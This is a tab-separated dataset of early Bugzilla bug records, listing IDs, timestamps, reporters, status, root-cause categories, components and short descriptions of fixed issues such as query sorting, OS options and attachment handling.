Id%TAB%Opening%TAB%Reporter%TAB%VerificationStatus%TAB%ResolutionStatus%TAB%RootCauseCategory%TAB%Components%TAB%Description%TAB%FullDescription
538%TAB%904184243%TAB%3791%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%HTML Dialogs,UI,Bugzilla-General%TAB%Bugzilla can't search bug lists for a text match%TAB%Bugzilla can't search bug lists for a text match
539%TAB%904196016%TAB%3794%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%MIMELib,UI,Bugzilla-General%TAB%enter_bug.cgi chokes if we have multiple products.%TAB%enter_bug.cgi chokes if we have multiple products.
541%TAB%904216125%TAB%3794%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Sorting the initial query by "assignee" doesn't work.%TAB%Sorting the initial query by "assignee" doesn't work.
542%TAB%904243888%TAB%3794%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Whine at people when they have bugs that have been NEW for longer than a week.%TAB%Whine at people when they have bugs that have been NEW for longer than a week.
543%TAB%904247176%TAB%1069%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Bug list should not be titled "Mozilla bug list"%TAB%Bug list should not be titled "Mozilla bug list"
546%TAB%904247924%TAB%1069%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Adding "CC" field does not work%TAB%Adding "CC" field does not work
548%TAB%904337598%TAB%1069%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Restore the "show my bugs" from the old Bugzilla%TAB%Restore the "show my bugs" from the old Bugzilla
553%TAB%904572270%TAB%3794%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need better querying of assigned_to and reported_by fields.%TAB%Need better querying of assigned_to and reported_by fields.
555%TAB%904626784%TAB%3794%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need a version-numbering scheme for bugzilla source.%TAB%Need a version-numbering scheme for bugzilla source.
734%TAB%905241741%TAB%3794%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need to add system 8.x for macs.%TAB%Need to add system 8.x for macs.
818%TAB%905777973%TAB%3900%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%debugging output obfuscating query,Internet Explorer can't handle server-push pages.%TAB%debugging output obfuscating query,Internet Explorer can't handle server-push pages.
824%TAB%905852847%TAB%3915%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%password filter is too picky%TAB%password filter is too picky
827%TAB%905918007%TAB%3914%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Crashed after adding comments to a bug.%TAB%Crashed after adding comments to a bug.
832%TAB%905979990%TAB%806%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Can't call method "prepare" without a package or object reference error%TAB%Can't call method "prepare" without a package or object reference error
842%TAB%906132436%TAB%3923%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%No MacOS 8 option in "OS" popup%TAB%No MacOS 8 option in "OS" popup
890%TAB%906634328%TAB%3953%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%buglist.cgi: apache changes boundary=ThisRandomString to boundary=thisrandomstring%TAB%buglist.cgi: apache changes boundary=ThisRandomString to boundary=thisrandomstring
1083%TAB%908194377%TAB%2147%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%password assignment mail had bad URL%TAB%password assignment mail had bad URL
1105%TAB%908456833%TAB%2791%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%new_comment.cgi allows blank lines and extraineous spaces%TAB%new_comment.cgi allows blank lines and extraineous spaces
1464%TAB%911568378%TAB%3847%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need OS option of Win 98 in Bugzilla ,Need OS option of Win 98 in Bugzilla%TAB%Need OS option of Win 98 in Bugzilla ,Need OS option of Win 98 in Bugzilla
1499%TAB%911737834%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Custom queries are not remembered.%TAB%Custom queries are not remembered.
1659%TAB%911996336%TAB%4037%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%buglist.cgi has mismatched case for server push break string%TAB%buglist.cgi has mismatched case for server push break string
1746%TAB%912669993%TAB%4030%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Change "Submit" button to "Query" on Query Page%TAB%Change "Submit" button to "Query" on Query Page
1749%TAB%912675796%TAB%3881%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%searching all fields,Ability to search all fields%TAB%searching all fields,Ability to search all fields
1765%TAB%912761876%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Would like to query URL field.%TAB%Would like to query URL field.
1840%TAB%913213140%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need to add Mac OS 8.5 to the OS list%TAB%Need to add Mac OS 8.5 to the OS list
1907%TAB%913629053%TAB%4237%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%When sorting bug list by "Importance" sort by severity as well as priority%TAB%When sorting bug list by "Importance" sort by severity as well as priority
2134%TAB%915462710%TAB%2791%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%bugzilla products cannot have spaces in the name%TAB%bugzilla products cannot have spaces in the name
2178%TAB%915531636%TAB%2791%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%bugs count charts are not displayed for products with spaces in the name%TAB%bugs count charts are not displayed for products with spaces in the name
2298%TAB%916132031%TAB%388%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Form Submission,Bugzilla,Bugzilla-General%TAB%Can't change OS when modifying a bug report%TAB%Can't change OS when modifying a bug report
2307%TAB%916155189%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Add TFV Field to Bugzilla%TAB%Add TFV Field to Bugzilla
2308%TAB%916155340%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need a QA Assigned field in Bugzilla.%TAB%Need a QA Assigned field in Bugzilla.
2311%TAB%916155653%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need a Status Summary Field in Bugzilla%TAB%Need a Status Summary Field in Bugzilla
2373%TAB%916322327%TAB%4125%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%[PP] please at a platform field for FreeBSD in the mozilla bug system%TAB%[PP] please at a platform field for FreeBSD in the mozilla bug system
2453%TAB%916490195%TAB%4054%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Queries: Setting a string to "" but requesting regexp causes error,Blank regexp expression not ignored%TAB%Queries: Setting a string to "" but requesting regexp causes error,Blank regexp expression not ignored
2497%TAB%916740172%TAB%4080%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need to set up bugzilla fields to include mail/news area%TAB%Need to set up bugzilla fields to include mail/news area
2640%TAB%917350877%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Moving bug from Bugsplat to Buzilla function does not work.%TAB%Moving bug from Bugsplat to Buzilla function does not work.
2656%TAB%917360587%TAB%4080%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Include an "enter new bug" link at http://bugzilla.mozilla.org/post_bug.cgi,Include an "enter new bug" link on post_bug.cgi%TAB%Include an "enter new bug" link at http://bugzilla.mozilla.org/post_bug.cgi,Include an "enter new bug" link on post_bug.cgi
2706%TAB%917434671%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Have MoveToBugzilla Button update bug to Closed/Won't Fix%TAB%Have MoveToBugzilla Button update bug to Closed/Won't Fix
2707%TAB%917435397%TAB%3849%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%should be able to enter several comma-seperated values ,should be able to enter several comma-seperated values%TAB%should be able to enter several comma-seperated values ,should be able to enter several comma-seperated values
2709%TAB%917436699%TAB%4080%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%URL field not preserved when moving from bugsplat to bugzilla%TAB%URL field not preserved when moving from bugsplat to bugzilla
2732%TAB%917458605%TAB%4080%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%RFE: can the placement of the cc: field and the QA contact: field's be switched%TAB%RFE: can the placement of the cc: field and the QA contact: field's be switched
2741%TAB%917506278%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%cc field not transferred in Move Bug to Buzilla ,cc field not transferred in Move Bug to Buzilla%TAB%cc field not transferred in Move Bug to Buzilla ,cc field not transferred in Move Bug to Buzilla
2827%TAB%917931099%TAB%2365%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Time axis labels jammed together%TAB%Time axis labels jammed together
3029%TAB%918475801%TAB%4080%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Pls reset the password for nbaca@netscape.com.,passwords broken for 1 out of 26 people%TAB%Pls reset the password for nbaca@netscape.com.,passwords broken for 1 out of 26 people
3167%TAB%919234593%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Better Embedding APIs definition to replace.%TAB%Better Embedding APIs definition to replace.
3186%TAB%919423301%TAB%3858%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%"Your browser sent a non-HTTP compliant message.",Bugzilla can use too much cookie space.%TAB%"Your browser sent a non-HTTP compliant message.",Bugzilla can use too much cookie space.
3223%TAB%919534701%TAB%4126%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Bad quip in bug list%TAB%Bad quip in bug list
3245%TAB%919765719%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%NG Layout QA Contact Additions...%TAB%NG Layout QA Contact Additions...
3271%TAB%919878999%TAB%1672%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Bugzilla: Mozilla product needs revamping%TAB%Bugzilla: Mozilla product needs revamping
3307%TAB%919971556%TAB%4054%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Default priority (P2) is too high and should be changed to P3%TAB%Default priority (P2) is too high and should be changed to P3
3362%TAB%920328001%TAB%4584%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%No support for Grendel in Bugzilla%TAB%No support for Grendel in Bugzilla
3364%TAB%920362561%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%QA contact name spelling correction%TAB%QA contact name spelling correction
3365%TAB%920362894%TAB%4237%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Incorrect collection of stats when zero NEW or ASSIGNED bugs%TAB%Incorrect collection of stats when zero NEW or ASSIGNED bugs
3583%TAB%921062969%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%URL Link problem in Bugzilla -TEST%TAB%URL Link problem in Bugzilla -TEST
3589%TAB%921075046%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Changing component does not reset default Assigned/QA%TAB%Changing component does not reset default Assigned/QA
4082%TAB%921861139%TAB%4150%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%XP Utilities,Bugzilla,Bugzilla-General%TAB%Need a way to track bug reports/resolution by date range%TAB%Need a way to track bug reports/resolution by date range
4106%TAB%921976840%TAB%4672%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%javascript mods to query.cgi do not work on MS IE%TAB%javascript mods to query.cgi do not work on MS IE
4133%TAB%922085710%TAB%4685%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%new query feature causes javascript error in IE4, hang in netscape%TAB%new query feature causes javascript error in IE4, hang in netscape
4243%TAB%922289686%TAB%4054%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Reopening bug leaves resolution%TAB%Reopening bug leaves resolution
4272%TAB%922363636%TAB%2147%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Bugzilla gets confused by news: URLs in Comment fields%TAB%Bugzilla gets confused by news: URLs in Comment fields
4337%TAB%922574603%TAB%4019%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%processmail regenerate broken.  Bugzilla 2.2%TAB%processmail regenerate broken.  Bugzilla 2.2
4402%TAB%922734808%TAB%4019%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Spaces cause major headaches in Product names%TAB%Spaces cause major headaches in Product names
4456%TAB%922875611%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Auto insert of general template into new bug%TAB%Auto insert of general template into new bug
4477%TAB%922943126%TAB%4681%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Change Columns Feature -- Adding Target Milestone not working.,bugzilla doesn't warn users they need cookies enabled%TAB%Change Columns Feature -- Adding Target Milestone not working.,bugzilla doesn't warn users they need cookies enabled
4566%TAB%923349585%TAB%4810%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Email password ... WHEN?%TAB%Email password ... WHEN?
4889%TAB%923666967%TAB%1698%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Request "Summary" be required field for new bugs%TAB%Request "Summary" be required field for new bugs
4928%TAB%923708163%TAB%4054%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%value attribute of login form hidden fields contains line breaks,escaping causes blank lines%TAB%value attribute of login form hidden fields contains line breaks,escaping causes blank lines
4971%TAB%923912544%TAB%4019%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Patch: Added -All- report, and UI cleanups%TAB%Patch: Added -All- report, and UI cleanups
5151%TAB%924193353%TAB%4130%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Can we have a link that leads back to the query result?%TAB%Can we have a link that leads back to the query result?
5152%TAB%924193531%TAB%4130%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%create a list by bug number%TAB%create a list by bug number
5179%TAB%924245059%TAB%422%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs%TAB%Need to be able to put attachment on new bug.%TAB%Need to be able to put attachment on new bug.
5227%TAB%924288474%TAB%589%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General,attachment and request management%TAB%Email not sent out for added attachments%TAB%Email not sent out for added attachments
5249%TAB%924433648%TAB%2791%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%query.cgi javascript does not work on netscape 4.04 and 4.05%TAB%query.cgi javascript does not work on netscape 4.04 and 4.05
5279%TAB%924524153%TAB%4943%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%undefined variable in query.cgi%TAB%undefined variable in query.cgi
5299%TAB%924537823%TAB%4090%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%too easy to lose stored queries%TAB%too easy to lose stored queries
5345%TAB%924641764%TAB%4019%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Show login name at bug entry time / enter_bug.cgi uses invalid html%TAB%Show login name at bug entry time / enter_bug.cgi uses invalid html
5424%TAB%924853512%TAB%4130%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%duplicates should take advantage of 'bug XXXX' hyperlinking%TAB%duplicates should take advantage of 'bug XXXX' hyperlinking
5480%TAB%925082840%TAB%4644%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General,attachment and request management%TAB%Bugzilla refuses to accept attachment except as type "text/html",Bugzilla refuses to accept attachment if it is very very big.%TAB%Bugzilla refuses to accept attachment except as type "text/html",Bugzilla refuses to accept attachment if it is very very big.
5592%TAB%925227652%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need a Blocker severity...%TAB%Need a Blocker severity...
5604%TAB%925236404%TAB%5051%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Add bug-writing-guidelines.html to Bugzilla%TAB%Add bug-writing-guidelines.html to Bugzilla
5605%TAB%925238144%TAB%5051%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Patch to add 'Add New Component'%TAB%Patch to add 'Add New Component'
5672%TAB%925315981%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Add "My Open Bugs" Canned Report on Bugzilla Main Page%TAB%Add "My Open Bugs" Canned Report on Bugzilla Main Page
5687%TAB%925368747%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need more "M"'s for Target Milestone%TAB%Need more "M"'s for Target Milestone
5816%TAB%925488434%TAB%4250%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Bugzilla does not remember the sorted column%TAB%Bugzilla does not remember the sorted column
5868%TAB%925724634%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Target Milestone link for CCK and MailNews not implemented.%TAB%Target Milestone link for CCK and MailNews not implemented.
5955%TAB%925896250%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need to be able to query by creation date.%TAB%Need to be able to query by creation date.
6198%TAB%926340657%TAB%4054%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Bug 5764 is invisible%TAB%Bug 5764 is invisible
6308%TAB%926487128%TAB%4054%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%I no longer get mailed when I change a bug!!!%TAB%I no longer get mailed when I change a bug!!!
6309%TAB%926494130%TAB%4019%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%"nospam" feature not case-insensitive%TAB%"nospam" feature not case-insensitive
6519%TAB%926768425%TAB%3881%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General,attachment and request management%TAB%problem with attachment MIME types%TAB%problem with attachment MIME types
6576%TAB%926940488%TAB%4426%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Add Mac OS 8.6%TAB%Add Mac OS 8.6
6623%TAB%926956865%TAB%4054%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%no comma between cclist and tolist in processmail "email sent to" output%TAB%no comma between cclist and tolist in processmail "email sent to" output
6649%TAB%927008790%TAB%5254%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Please add NTO Platform and OS and possible Photon GUI if such a place exists%TAB%Please add NTO Platform and OS and possible Photon GUI if such a place exists
6677%TAB%927026699%TAB%5051%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Ignore case on bug searches%TAB%Ignore case on bug searches
6682%TAB%927028097%TAB%5051%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Chart all bug states%TAB%Chart all bug states
6801%TAB%927186050%TAB%5265%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%install: syntax error in SQL in makeprofilestable.sh%TAB%install: syntax error in SQL in makeprofilestable.sh
6855%TAB%927207252%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Some new Bugzilla account requests not going through%TAB%Some new Bugzilla account requests not going through
6879%TAB%927215558%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Can new components auto alphabatize into component list?%TAB%Can new components auto alphabatize into component list?
6939%TAB%927408520%TAB%979%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Website,Bugzilla,Bugzilla-General%TAB%component needs adding for slamm's unix build configuration tool%TAB%component needs adding for slamm's unix build configuration tool
6944%TAB%927454707%TAB%4054%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%buglist: summary and whiteboard fight for space%TAB%buglist: summary and whiteboard fight for space
6945%TAB%927455209%TAB%4054%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Potential clashes when submitting bug updates%TAB%Potential clashes when submitting bug updates
6987%TAB%927540155%TAB%3822%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Allow specification of "dependent" bugs within a bug%TAB%Allow specification of "dependent" bugs within a bug
7000%TAB%927549168%TAB%4432%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Bugzilla sometimes does not set mailto:-Links properly%TAB%Bugzilla sometimes does not set mailto:-Links properly
7088%TAB%927648900%TAB%5309%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Request a preference to disable email name validation%TAB%Request a preference to disable email name validation
7233%TAB%927802228%TAB%5309%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Administration%TAB%versions rows should be forced to be unique,Editversions.cgi has a potential race resulting in duplicate versions%TAB%versions rows should be forced to be unique,Editversions.cgi has a potential race resulting in duplicate versions
7337%TAB%927925934%TAB%5300%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General,attachment and request management%TAB%running makeattachmenttable.sh not included in instructions%TAB%running makeattachmenttable.sh not included in instructions
7338%TAB%927926107%TAB%5300%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%process_bug.cgi omits PutHeader call%TAB%process_bug.cgi omits PutHeader call
7710%TAB%928703320%TAB%4956%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,User Accounts%TAB%Option to automatically put me on the CC: list of bugs I change,Pref to automatically put me on the CC: list of bugs I change%TAB%Option to automatically put me on the CC: list of bugs I change,Pref to automatically put me on the CC: list of bugs I change
7716%TAB%928743433%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Add link to Bug Writing Guideline off Bugzilla main page%TAB%Add link to Bug Writing Guideline off Bugzilla main page
7782%TAB%928841553%TAB%4125%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Bugzilla doesn't sort milestones correctly%TAB%Bugzilla doesn't sort milestones correctly
7838%TAB%928910053%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need most-frequent-bugs page link put on Bugzilla pages%TAB%Need most-frequent-bugs page link put on Bugzilla pages
7873%TAB%928937086%TAB%4054%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%mid air collision and duplicates,duplicate isn't always resolved duplicate when marking as such,duplicate isn't always resolved DUP when marking as such%TAB%mid air collision and duplicates,duplicate isn't always resolved duplicate when marking as such,duplicate isn't always resolved DUP when marking as such
7953%TAB%929030014%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Popup Window when new Bugzilla Account files a first bug,Message pointing to bug writing resources with passwd mailout%TAB%Popup Window when new Bugzilla Account files a first bug,Message pointing to bug writing resources with passwd mailout
7983%TAB%929078612%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need a "Depends" Target Milestone%TAB%Need a "Depends" Target Milestone
8069%TAB%929242095%TAB%4644%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Cookie text appearing above banners of bug lists in MSIE 5.0 ,Cookie text appearing above banners of bug lists in MSIE 5.0,Cookie text appearing above banners of bug lists in all non Mozilla browsers%TAB%Cookie text appearing above banners of bug lists in MSIE 5.0 ,Cookie text appearing above banners of bug lists in MSIE 5.0,Cookie text appearing above banners of bug lists in all non Mozilla browsers
8096%TAB%929316760%TAB%5503%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Need "BeOS" added to Bugzilla%TAB%Need "BeOS" added to Bugzilla
8279%TAB%929480153%TAB%4351%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%changedto not in query.cgi defaults%TAB%changedto not in query.cgi defaults
8458%TAB%929629538%TAB%5556%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Bugzilla 2.4 is not automagically emailing passwords%TAB%Bugzilla 2.4 is not automagically emailing passwords
8493%TAB%929702612%TAB%1698%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Component descriptions are truncated.%TAB%Component descriptions are truncated.
8647%TAB%929991808%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Query/Bug List%TAB%Allow sorting by last changed date & time.,Query screen should have option to sort on last changed date/time.%TAB%Allow sorting by last changed date & time.,Query screen should have option to sort on last changed date/time.
8650%TAB%929998741%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Allow easy access to queries through initial screen.%TAB%Allow easy access to queries through initial screen.
8716%TAB%930063313%TAB%1537%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%make bugzilla associate patches with who attached them%TAB%make bugzilla associate patches with who attached them
8823%TAB%930153544%TAB%4054%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Include a find bug link on the bug updated page,Include a "find bug #" form on the bug updated page%TAB%Include a find bug link on the bug updated page,Include a "find bug #" form on the bug updated page
9302%TAB%931253050%TAB%3881%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Would be nice if attachment + number was a link too.%TAB%Would be nice if attachment + number was a link too.
9310%TAB%931257293%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%View Bug Activity does not document Assigned To changes.%TAB%View Bug Activity does not document Assigned To changes.
9352%TAB%931335663%TAB%5609%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Version names longer than 16 characters causes problems,bugs.version varchar(16) vs 64 and reserved word conflict%TAB%Version names longer than 16 characters causes problems,bugs.version varchar(16) vs 64 and reserved word conflict
9409%TAB%931377072%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Reporting/Charting%TAB%Allow any combination of Products in summary reports.%TAB%Allow any combination of Products in summary reports.
